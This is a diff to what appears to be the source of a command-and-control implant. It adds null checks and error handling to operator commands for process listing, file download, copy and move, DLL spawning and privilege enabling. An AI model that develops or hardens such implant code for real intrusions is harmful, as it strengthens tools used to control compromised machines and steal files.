@@ -363,6 +363,12 @@ VOID CommandProc( PPARSER Parser )
 
             ProcessName = ParserGetWString( Parser, &ProcessSize );
 
+            if ( ! ProcessName )
+            {
+                PUTS( "Proc::Grep: failed to parse process name" )
+                break;
+            }
+
             if ( NT_SUCCESS( NtStatus = ProcessSnapShot( &SysProcessInfo, &ProcessInfoSize ) ) )
             {
                 PRINTF( "SysProcessInfo: %p\n", SysProcessInfo );
@@ -839,6 +845,13 @@ VOID CommandFS( PPARSER Parser )
 
             Buffer = ParserGetBytes( Parser, &FileName.Length );
 
+            if ( ! Buffer || ! FileName.Length )
+            {
+                PUTS( "FS::Download: failed to parse file name" )
+                Success = FALSE;
+                goto CleanupDownload;
+            }
+
             FileName.Buffer = MmHeapAlloc( FileName.Length + sizeof( WCHAR ) );
             MemCopy( FileName.Buffer, Buffer, FileName.Length );
 
@@ -1053,6 +1066,15 @@ VOID CommandFS( PPARSER Parser )
             PathFrom = ParserGetWString( Parser, &FromSize );
             PathTo   = ParserGetWString( Parser, &ToSize );
 
+            if ( ! PathFrom || ! PathTo )
+            {
+                PUTS( "FS::Copy: failed to parse paths" )
+                PackageAddInt32( Package, FALSE );
+                PackageAddWString( Package, L"" );
+                PackageAddWString( Package, L"" );
+                break;
+            }
+
             PRINTF( "Copy file %ls to %ls\n", PathFrom, PathTo )
 
             Success = Instance->Win32.CopyFileW( PathFrom, PathTo, FALSE );
@@ -1077,6 +1099,15 @@ VOID CommandFS( PPARSER Parser )
 
             PathFrom = ParserGetWString( Parser, &FromSize );
             PathTo   = ParserGetWString( Parser, &ToSize );
+
+            if ( ! PathFrom || ! PathTo )
+            {
+                PUTS( "FS::Move: failed to parse paths" )
+                PackageAddInt32( Package, FALSE );
+                PackageAddWString( Package, L"" );
+                PackageAddWString( Package, L"" );
+                break;
+            }
 
             PRINTF( "Move file %ls to %ls\n", PathFrom, PathTo )
 
@@ -1286,9 +1317,9 @@ VOID CommandSpawnDLL( PPARSER Parser )
     UINT32        DllSize    = 0;
     UINT32        ArgSize    = 0;
     UINT32        DllLdrSize = 0;
-    PCHAR         DllLdr     = ParserGetString( Parser, &DllLdrSize );
-    PCHAR         DllBytes   = ParserGetString( Parser, &DllSize );
-    PCHAR         Arguments  = ParserGetString( Parser, &ArgSize );
+    PCHAR         DllLdr     = ParserGetBytes( Parser, &DllLdrSize );
+    PCHAR         DllBytes   = ParserGetBytes( Parser, &DllSize );
+    PCHAR         Arguments  = ParserGetBytes( Parser, &ArgSize );
     DWORD         Result     = 0;
 
     Package = PackageCreate( DEMON_COMMAND_SPAWN_DLL );
@@ -1550,8 +1581,17 @@ VOID CommandToken( PPARSER Parser )
                 PUTS( "Privs::Get" )
                 PrivName = ParserGetString( Parser, &PrivNameLength );
 
-                PackageAddInt32( Package, TokenSetPrivilege( PrivName, TRUE ) );
-                PackageAddString( Package, PrivName );
+                if ( ! PrivName )
+                {
+                    PUTS( "Privs::Get: failed to parse privilege name" )
+                    PackageAddInt32( Package, FALSE );
+                    PackageAddString( Package, "" );
+                }
+                else
+                {
+                    PackageAddInt32( Package, TokenSetPrivilege( PrivName, TRUE ) );
+                    PackageAddString( Package, PrivName );
+                }
             }
 
             if ( TokenPrivs )
